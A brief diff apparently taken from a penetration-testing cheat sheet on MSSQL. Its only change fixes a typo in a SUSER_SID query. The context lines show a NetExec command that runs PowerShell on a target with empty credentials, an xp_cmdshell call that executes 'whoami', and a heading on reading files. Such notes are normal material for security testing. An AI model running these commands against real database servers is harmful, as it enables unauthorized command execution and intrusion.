@@ -130,7 +130,7 @@ nxc mssql $ip -u '' -p '' -x "powershell -c Get-Host"
 ```bash
  EXEC xp_cmdshell 'whoami';
 
- SELECT SUSER_SID('use_name'); 
+ SELECT SUSER_SID('user_name'); 
  ```
 ## Read  files
 ```bash
